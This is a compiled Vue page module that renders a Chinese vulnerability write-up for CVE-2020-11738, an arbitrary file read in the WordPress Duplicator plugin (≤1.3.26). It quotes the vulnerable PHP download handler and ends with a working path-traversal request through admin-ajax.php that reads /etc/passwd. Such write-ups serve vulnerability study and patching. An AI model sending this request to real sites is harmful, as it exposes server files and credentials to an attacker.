import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o as d,c as s,a as e,b as t,d as r,e as i}from"./app-58e4a7d6.js";const c={},o=i(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>WordPress Duplicator插件由于对文件下载没有进行验证，则导致了任意文件读取漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Duplicator &lt;= v1.3.26
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="插件名" tabindex="-1"><a class="header-anchor" href="#插件名" aria-hidden="true">#</a> 插件名</h2><p>Duplicator</p>`,6),p={href:"https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip",target:"_blank",rel:"noopener noreferrer"},u=i(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>首先先查看注册的无需授权的action接口 <code>wp-content/plugins/duplicator/ctrls/class.web.services.php</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241332267.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这里 <code>wp_ajax_nopriv_duplicator_download</code> 对应的函数名为 duplicator_download</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241332007.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public static function duplicator_download() {
        $file = sanitize_text_field($_GET[&#39;file&#39;]);
        $filepath = DUPLICATOR_SSDIR_PATH.&#39;/&#39;.$file;
        // Process download
        if(file_exists($filepath)) {
            // Clean output buffer
            if (ob_get_level() !== 0 &amp;&amp; @ob_end_clean() === FALSE) {
                @ob_clean();
            }

            header(&#39;Content-Description: File Transfer&#39;);
            header(&#39;Content-Type: application/octet-stream&#39;);
            header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.basename($filepath).&#39;&quot;&#39;);
            header(&#39;Expires: 0&#39;);
            header(&#39;Cache-Control: must-revalidate&#39;);
            header(&#39;Pragma: public&#39;);
            header(&#39;Content-Length: &#39; . filesize($filepath));
            flush(); // Flush system output buffer

            try {
                $fp = @fopen($filepath, &#39;r&#39;);
                if (false === $fp) {
                    throw new Exception(&#39;Fail to open the file &#39;.$filepath);
                }
                while (!feof($fp) &amp;&amp; ($data = fread($fp, DUPLICATOR_BUFFER_READ_WRITE_SIZE)) !== FALSE) {
                    echo $data;
                }
                @fclose($fp);
            } catch (Exception $e) {
                readfile($filepath);
            }
            exit;
        } else {
            wp_die(&#39;Invalid installer file name!!&#39;);
        }
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到这里接受参数 file，拼接至 $filepath 中，通过调试可以得知</p><p>DUPLICATOR_SSDIR_PATH 为 wp-snapshots 目录，file可控且没有过滤，导致任意文件读取</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/wp-admin/admin-ajax.php?action=duplicator_download&amp;file=../../../../../etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241334750.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,10);function v(m,h){const n=l("ExternalLinkIcon");return d(),s("div",null,[o,e("p",null,[e("a",p,[t("https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip"),r(n)])]),u])}const _=a(c,[["render",v],["__file","WordPress Duplicator duplicator.php 任意文件读取漏洞 CVE-2020-11738.html.vue"]]);export{_ as default};
